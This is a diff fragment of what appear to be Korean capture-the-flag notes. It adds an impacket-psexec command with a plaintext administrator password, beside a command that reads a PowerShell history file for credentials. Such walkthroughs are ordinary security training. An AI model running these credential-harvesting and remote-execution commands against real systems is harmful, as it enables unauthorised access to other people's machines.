@@ -65,6 +65,6 @@ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Co
 ### impacket-psexec
 ```bash
 # runas의 경우 reverse shell이 non-interactive 여서 Password 입력 불가
-
+impacket-psexec administrator:MEGACORP_4dm1n\!\!@
 
 ```
